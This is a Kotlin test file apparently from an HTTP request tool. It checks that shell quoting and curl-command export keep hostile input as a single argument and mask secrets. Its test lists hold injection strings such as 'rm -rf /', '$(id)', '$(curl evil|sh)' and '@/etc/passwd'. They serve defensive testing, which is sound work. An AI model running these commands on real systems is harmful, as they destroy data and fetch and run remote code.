package dev.nekuz.reqlab

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Assert.fail
import org.junit.Test

object PosixWords {
    private const val METACHARACTERS = ";&|<>()`\$\"*?[]#~=%!{}^"

    fun split(command: String): List<String> {
        val words = ArrayList<String>()
        val word = StringBuilder()
        var inWord = false
        var index = 0
        while (index < command.length) {
            val c = command[index]
            when {
                c == '\\' && index + 1 < command.length && command[index + 1] == '\n' -> index += 2
                c == ' ' || c == '\n' -> {
                    if (c == '\n') fail("Unquoted newline runs the next line as a command")
                    if (inWord) words.add(word.toString())
                    word.clear()
                    inWord = false
                    index++
                }
                c == '\'' -> {
                    val close = command.indexOf('\'', index + 1)
                    if (close < 0) fail("Unterminated quote")
                    word.append(command, index + 1, close)
                    inWord = true
                    index = close + 1
                }
                c == '\\' && index + 1 < command.length && command[index + 1] == '\'' -> {
                    word.append('\'')
                    inWord = true
                    index += 2
                }
                c == '$' && index + 1 < command.length && command[index + 1] == '\'' -> {
                    index = ansi(command, index + 2, word)
                    inWord = true
                }
                c in METACHARACTERS && !(c == '=' && inWord) -> fail("Unquoted metacharacter $c in: $command")
                else -> {
                    word.append(c)
                    inWord = true
                    index++
                }
            }
        }
        if (inWord) words.add(word.toString())
        return words
    }

    private fun ansi(command: String, start: Int, word: StringBuilder): Int {
        var index = start
        val bytes = java.io.ByteArrayOutputStream()
        fun flush() {
            if (bytes.size() > 0) word.append(String(bytes.toByteArray(), Charsets.UTF_8))
            bytes.reset()
        }
        while (index < command.length) {
            val c = command[index]
            if (c == '\'') {
                flush()
                return index + 1
            }
            if (c == '\\') {
                val next = command[index + 1]
                if (next == 'x') {
                    bytes.write(command.substring(index + 2, index + 4).toInt(16))
                    index += 4
                    continue
                }
                flush()
                word.append(
                    when (next) {
                        'n' -> '\n'
                        'r' -> '\r'
                        't' -> '\t'
                        '\\' -> '\\'
                        '\'' -> '\''
                        else -> fail("Unknown escape $next") as Nothing
                    },
                )
                index += 2
                continue
            }
            flush()
            word.append(c)
            index++
        }
        fail("Unterminated ANSI quote")
        return index
    }
}

class ShellQuoteTest {
    private val hostile = listOf(
        "", " ", "plain", "it's", "'", "''", "'''", "'; rm -rf / #", "\$(id)", "`id`", "\${HOME}", "a b", "a\nb", "\n", "\n\n; rm -rf /\n",
        "\"double\"", "back\\slash", "\\", "\\\\", "\\'", "!history", "!!", "*", "?", "~", "#c", "&", "|", ";", "<", ">", "(x)", "{a,b}", "[x]", "%s",
        "tab\there", "\r\nX: y", "cr\rcr", "\u001B[201~; rm -rf /", "\u001B]0;title\u0007", "\u0003", "\u007F", "\u0085", "\u202Egnp.exe", "\u2028", "\u2029",
        "\uFEFF", "\u200B", "é", "日本語", "😀", "'\n'\$(id)'\n", "--output=/etc/passwd", "-X", "@/etc/passwd", "a\u001Bb'c", "'\u0001'\\\u0002",
    )

    @Test
    fun everyHostileStringRoundTripsAsOneWord() {
        hostile.forEach { text ->
            val quoted = ShellQuote.quote(text)!!
            assertEquals(text, listOf(text), PosixWords.split(quoted))
        }
    }

    @Test
    fun concatenationStaysOneWord() {
        hostile.forEach { a ->
            val command = "cmd " + ShellQuote.quote(a) + " " + ShellQuote.quote("next")
            assertEquals(listOf("cmd", a, "next"), PosixWords.split(command))
        }
    }

    @Test
    fun simpleTextUsesSingleQuotes() {
        assertEquals("'a b'", ShellQuote.quote("a b"))
        assertEquals("'it'\\''s'", ShellQuote.quote("it's"))
        assertEquals("''", ShellQuote.quote(""))
        assertEquals("'a\nb'", ShellQuote.quote("a\nb"))
    }

    @Test
    fun controlsUseEscapesAndLeaveNoRawControl() {
        listOf("\u001B", "\r", "\t", "\u0007", "\u202E", "\u2028", "\u0085", "\uFEFF").forEach { text ->
            val quoted = ShellQuote.quote("a${text}b")!!
            assertTrue(quoted.startsWith("$'"))
            assertFalse(quoted.contains(text))
        }
    }

    @Test
    fun escapedFormDoesNotExposeHistoryExpansion() {
        val quoted = ShellQuote.quote("\u0001!x")!!
        assertFalse(quoted.contains('!'))
    }

    @Test
    fun nulIsNotRepresentable() {
        assertNull(ShellQuote.quote("a\u0000b"))
    }

    @Test
    fun loneSurrogateIsReplaced() {
        assertEquals(listOf("a�b"), PosixWords.split(ShellQuote.quote("a\uD800b")!!))
    }

    @Test
    fun hexEscapeIsNotFollowedByGreedyDigits() {
        val quoted = ShellQuote.quote("\u0001abc")!!
        assertEquals(listOf("\u0001abc"), PosixWords.split(quoted))
        assertTrue(quoted.contains("\\x01abc"))
    }
}

class CurlExportTest {
    private fun plan(spec: RequestSpec, vars: Map<String, String> = emptyMap()) =
        (RequestBuilder.build(spec, vars) as BuildResult.Ready).plan

    private fun words(spec: RequestSpec, mask: Boolean = false) =
        PosixWords.split(CurlExport.command(plan(spec), mask)!!)

    private fun valueAfter(words: List<String>, flag: String) = words[words.indexOf(flag) + 1]

    @Test
    fun simpleGet() {
        assertEquals(listOf("curl", "--globoff", "--url", "http://h.test/x"), words(RequestSpec(url = "http://h.test/x")))
    }

    @Test
    fun methodsUseCorrectFlags() {
        assertTrue(words(RequestSpec(method = HttpMethod.HEAD, url = "http://h/")).contains("--head"))
        assertFalse(words(RequestSpec(method = HttpMethod.HEAD, url = "http://h/")).contains("-X"))
        listOf(HttpMethod.POST, HttpMethod.PUT, HttpMethod.PATCH, HttpMethod.DELETE, HttpMethod.OPTIONS).forEach {
            assertEquals(it.name, valueAfter(words(RequestSpec(method = it, url = "http://h/")), "-X"))
        }
    }

    @Test
    fun followAddsLocation() {
        assertTrue(words(RequestSpec(url = "http://h/", followRedirects = true)).contains("--location"))
        assertFalse(words(RequestSpec(url = "http://h/")).contains("--location"))
    }

    @Test
    fun bodyUsesDataRawSoAtFilesAreNotRead() {
        val spec = RequestSpec(method = HttpMethod.POST, url = "http://h/", bodyText = "@/etc/passwd")
        assertEquals("@/etc/passwd", valueAfter(words(spec), "--data-raw"))
    }

    @Test
    fun emptyHeaderUsesSemicolonForm() {
        assertEquals("X-Empty;", valueAfter(words(RequestSpec(url = "http://h/", headers = listOf(Kv("X-Empty", "")))), "-H"))
    }

    @Test
    fun hostileValuesStayInsideOneArgument() {
        val attacks = listOf(
            "'; rm -rf / #", "\$(curl evil|sh)", "`id`", "a' -o '/tmp/x", "\" && id && \"", "\\'; id; \\'",
            "%0a", "!!", "--output=/tmp/x",
        )
        attacks.forEach { attack ->
            val spec = RequestSpec(
                method = HttpMethod.POST,
                url = "http://h.test/",
                params = listOf(Kv("q", attack)),
                headers = listOf(Kv("X-A", attack)),
                bodyText = attack,
            )
            val words = words(spec)
            assertEquals(attack, listOf("curl", "--globoff", "-X", "POST", "--url"), words.take(5))
            assertEquals(attack, "X-A: $attack", valueAfter(words, "-H"))
            assertEquals(attack, attack, valueAfter(words, "--data-raw"))
            assertEquals(attack, 12, words.size)
        }
    }

    @Test
    fun hostileBodyWithControlsRoundTrips() {
        val body = "line1\nline2\u001B[201~; rm -rf /\r\n'\$(id)'\t\u202E"
        val spec = RequestSpec(method = HttpMethod.POST, url = "http://h/", bodyText = body)
        assertEquals(body, valueAfter(words(spec), "--data-raw"))
    }

    @Test
    fun multilineJsonRoundTrips() {
        val body = "{\n  \"a\": \"it's\"\n}"
        val spec = RequestSpec(method = HttpMethod.POST, url = "http://h/", bodyType = BodyType.JSON, bodyText = body)
        assertEquals(body, valueAfter(words(spec), "--data-raw"))
    }

    @Test
    fun urlFromVariableIsQuoted() {
        val vars = mapOf("p" to "x'y z\$(id)")
        val command = CurlExport.command(plan(RequestSpec(url = "http://h/{{p}}"), vars), false)!!
        val url = valueAfter(PosixWords.split(command), "--url")
        assertEquals("http://h/x'y%20z\$(id)", url)
    }

    @Test
    fun ipv6UrlNeedsGloboff() {
        assertTrue(words(RequestSpec(url = "http://[::1]:8000/")).contains("--globoff"))
    }

    @Test
    fun nulInBodyMeansNoCommand() {
        val spec = RequestSpec(method = HttpMethod.POST, url = "http://h/", bodyText = "a\u0000b")
        assertNull(CurlExport.command(plan(spec), false))
        assertNull(CurlExport.command(plan(spec), true))
    }

    @Test
    fun maskedCommandHidesSecrets() {
        val spec = RequestSpec(
            method = HttpMethod.POST,
            url = "http://h/{{token}}?api_key=k1",
            headers = listOf(Kv("Cookie", "c1"), Kv("Accept", "a1")),
            auth = Auth(AuthType.BASIC, username = "user1", password = "pass1"),
            bodyText = "b {{token}} pass1",
        )
        val command = CurlExport.command(plan(spec, mapOf("token" to "tok1")), true)!!
        listOf("tok1", "k1", "c1", "user1", "pass1", "Basic").forEach { assertFalse(it, command.contains(it)) }
        assertTrue(command.contains("Accept: a1"))
        assertTrue(command.contains("Authorization: ***"))
    }

    @Test
    fun fullCommandKeepsSecrets() {
        val spec = RequestSpec(url = "http://h/", auth = Auth(AuthType.BEARER, token = "tok1"))
        assertTrue(CurlExport.command(plan(spec), false)!!.contains("Authorization: Bearer tok1"))
    }
}
